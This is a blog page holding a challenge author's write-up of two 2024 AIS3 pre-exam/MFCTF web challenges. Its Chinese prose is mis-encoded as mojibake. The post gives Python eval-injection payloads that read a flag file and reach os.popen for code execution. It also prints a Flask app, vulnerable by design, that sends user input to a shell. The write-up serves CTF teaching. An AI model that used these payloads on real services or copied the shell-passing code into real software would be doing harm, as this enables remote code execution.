<!doctype html>
<html lang="zh"><head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "nq90i0uzl9");
    </script>
    <!-- Microsoft Clarity ends-->
    <!-- Google tag (gtag.js) begins-->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'AW-16453505124');
    </script>
    <!-- Google tag (gtag.js) ends-->
    <!-- hexo injector head_begin end --><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>åˆ†é¡: CTF - TriangeSnake&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="TriangeSnake&#039;s Blog"><meta name="msapplication-TileImage" content="/img/trianglesnake.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="TriangeSnake&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="TriangeSnake&#039;s Blog"><meta property="og:url" content="https://blog.trianglesnake.com/"><meta property="og:site_name" content="TriangeSnake&#039;s Blog"><meta property="og:locale" content="zh_TW"><meta property="og:image" content="https://blog.trianglesnake.com/img/og_image.png"><meta property="article:author" content="TriangleSnake"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://blog.trianglesnake.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.trianglesnake.com"},"headline":"TriangeSnake's Blog","image":["https://blog.trianglesnake.com/img/og_image.png"],"author":{"@type":"Person","name":"TriangleSnake"},"publisher":{"@type":"Organization","name":"TriangeSnake's Blog","logo":{"@type":"ImageObject","url":"https://blog.trianglesnake.com/img/triblog.svg"}},"description":""}</script><link rel="icon" href="/img/trianglesnake.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/triblog.svg" alt="TriangeSnake&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/trianglesnake"><i class="fab fa-github"></i></a><a class="navbar-item search" title="æœå°‹" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/categories">åˆ†é¡</a></li><li class="is-active"><a href="#" aria-current="page">CTF</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-06-30T06:04:15.000Z" title="2024/6/30 ä¸‹åˆ2:04:15">2024-06-30</time>ç™¼è¡¨</span><span class="level-item"><time dateTime="2024-08-28T05:12:03.859Z" title="2024/8/28 ä¸‹åˆ1:12:03">2024-08-28</time>æ›´æ–°</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a><span>Â /Â </span><a class="link-muted" href="/categories/CTF/Writeup/">Writeup</a></span><span class="level-item">17 åˆ†é˜è®€å®Œ (å¤§ç´„2538å€‹å­—)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/06/30/2024-AIS3-pre-exam-MFCTF-writeup/">2024 AIS3 pre-exam &amp; MFCTF writeup</a></p><div class="content"><h1 id="2024-AIS3-pre-exam-writeup"><a href="#2024-AIS3-pre-exam-writeup" class="headerlink" title="2024 AIS3 pre-exam writeup"></a>2024 AIS3 pre-exam writeup</h1><p>é€™æ¬¡å¹« AIS3 pre-exam å’Œ MFCTF å‡ºé¡Œï¼Œå‡ºäº†å…©é¡Œï¼šä¸€é¡Œ web å’Œä¸€é¡Œ misc (ä½†å…¶å¯¦å…©é¡Œéƒ½æ˜¯web)</p>
<h2 id="evil-calculator"><a href="#evil-calculator" class="headerlink" title="evil calculator"></a>evil calculator</h2><blockquote>
<p>This is a calculator written in Python. Itâ€™s a simple calculator, but some function in it is VERY EVIL!!<br>Connection info: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:5001/">http://chals1.ais3.org:5001</a><br>Author: TriangleSnake</p>
</blockquote>
<p>é€™æ˜¯ä¸€é¡Œå¾ˆç°¡å–®çš„pyjail(?æœ‰jailå—)ï¼Œä¸»è¦å•é¡Œå‡ºåœ¨ <code>eval()</code> functionï¼Œä½†æ˜¯æœ‰éæ¿¾ <code>_</code> å’Œ <code>space</code> ã€‚<br>å› ç‚ºæ˜¯warmupé¡Œï¼Œé æœŸè§£æ˜¯ç”¨<code>open()</code>è®€flagï¼Œä¸æœƒç”¨åˆ°<code>_</code>å’Œ<code>space</code>ã€‚</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span><span class="string">&quot;open(&#x27;/flag&#x27;,&#x27;r&#x27;).read()&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç•¶ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠ <code>_</code> å’Œ <code>space</code> encode å¾Œ rce</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span><span class="string">&quot;eval(eval(&#x27;chr(95)&#x27;)+eval(&#x27;chr(95)&#x27;)+&#x27;import&#x27;+eval(&#x27;chr(95)&#x27;)+eval(&#x27;chr(95)&#x27;)+\&quot;(&#x27;os&#x27;).popen(&#x27;&#x27;).read()\&quot;)&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{7RiANG13_5NAK3_I5_50_3Vi1}</p>
</blockquote>
<h2 id="emoji-console"><a href="#emoji-console" class="headerlink" title="emoji console"></a>emoji console</h2><blockquote>
<p>ğŸ”ºğŸ ğŸ˜¡ ğŸ…°ï¸ ğŸ†’ 1ï¸âƒ£â“‚ï¸ğŸ…¾ï¸ ğŸš…â˜ ï¸âœ‰ï¸ ğŸ¥«ğŸ«µ ğŸ”ğŸš©â‰ï¸<br>Connection info: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:5000/">http://chals1.ais3.org:5000</a><br>Author: TriangleSnake</p>
</blockquote>
<p>é€™é¡Œå’Œè³‡å®‰æ²’ä»€éº¼é—œä¿‚ï¼Œç´”ç²¹æ˜¯æ‹¼å­—éŠæˆ²ï¼Œå¯ä»¥éš¨ä¾¿æŒ‰å¹¾å€‹ emoji å¾Œå°±å¯ä»¥ç™¼ç¾ä»–å°±æ˜¯æŠŠä½ è¼¸å…¥çš„ emoji è½‰æˆè‹±æ–‡å–®å­—å¾Œè®Šæˆä¸€è¡ŒæŒ‡ä»¤</p>
<p><img src="/2024/06/30/2024-AIS3-pre-exam-MFCTF-writeup/1.png" alt="image"></p>
<p>è©¦å¹¾æ¬¡æœƒç™¼ç¾ä¸€äº›å¸¸ç”¨çš„æŒ‡ä»¤ï¼Œåƒæ˜¯ ğŸ±-&gt;<code>cat</code> ã€ ğŸ’¿-&gt;<code>cd</code> ï¼Œé‚„æœ‰é¡Œç›®å‰›é€²å»å°±æç¤ºçš„ ğŸ-&gt;<code>python</code> å’Œ â­-&gt;<code>*</code></p>
<ol>
<li>å˜—è©¦ä½¿ç”¨ <code>cat</code> å‘½ä»¤çœ‹ç›®éŒ„ä¸‹é¢æœ‰ä»€éº¼<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğŸ± â­</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,send_file,request,redirect,jsonify,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">translate</span>(<span class="params">command:<span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    emoji_table = json.load(<span class="built_in">open</span>(<span class="string">&#x27;emoji.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> emoji_table:</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> command:</span><br><span class="line">            command = command.replace(key,emoji_table[key])</span><br><span class="line">    <span class="keyword">return</span> command.lower()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    command = request.args.get(<span class="string">&#x27;command&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(command).intersection(<span class="built_in">set</span>(string.printable.replace(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>))))&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;command&#x27;</span>:command,<span class="string">&#x27;result&#x27;</span>:<span class="string">&#x27;Invalid command&#x27;</span>&#125;)</span><br><span class="line">    command = translate(command)</span><br><span class="line">    result = os.popen(command+<span class="string">&quot; 2&gt;&amp;1&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;command&#x27;</span>:command,<span class="string">&#x27;result&#x27;</span>:result&#125;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;ğŸ˜€&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜‚&quot;</span>: <span class="string">&quot;:&#x27;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤£&quot;</span>: <span class="string">&quot;XD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜ƒ&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜„&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜…&quot;</span>: <span class="string">&quot;&#x27;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜†&quot;</span>: <span class="string">&quot;XD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜‰&quot;</span>: <span class="string">&quot;;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜Š&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜‹&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;B)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜˜&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜—&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜™&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜š&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â˜ºï¸&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™‚&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤—&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤©&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤”&quot;</span>: <span class="string">&quot;:?&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¨&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜‘&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¶&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™„&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:]&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜£&quot;</span>: <span class="string">&quot;&gt;:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¥&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜®&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¯&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜ª&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜«&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜´&quot;</span>: <span class="string">&quot;Zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜Œ&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜›&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜œ&quot;</span>: <span class="string">&quot;;P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;XP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¤&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜’&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜“&quot;</span>: <span class="string">&quot;;/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜”&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜•&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™ƒ&quot;</span>: <span class="string">&quot;(:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤‘&quot;</span>: <span class="string">&quot;$)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜²&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â˜¹ï¸&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜–&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜Ÿ&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¤&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¢&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜­&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¦&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜§&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¨&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜©&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¯&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¬&quot;</span>: <span class="string">&quot;:E&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜°&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜±&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥µ&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥¶&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜³&quot;</span>: <span class="string">&quot;:$&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤ª&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜µ&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥´&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜ &quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜¡&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¬&quot;</span>: <span class="string">&quot;#$%&amp;!&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤•&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¢&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤®&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤§&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜‡&quot;</span>: <span class="string">&quot;O:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥³&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥º&quot;</span>: <span 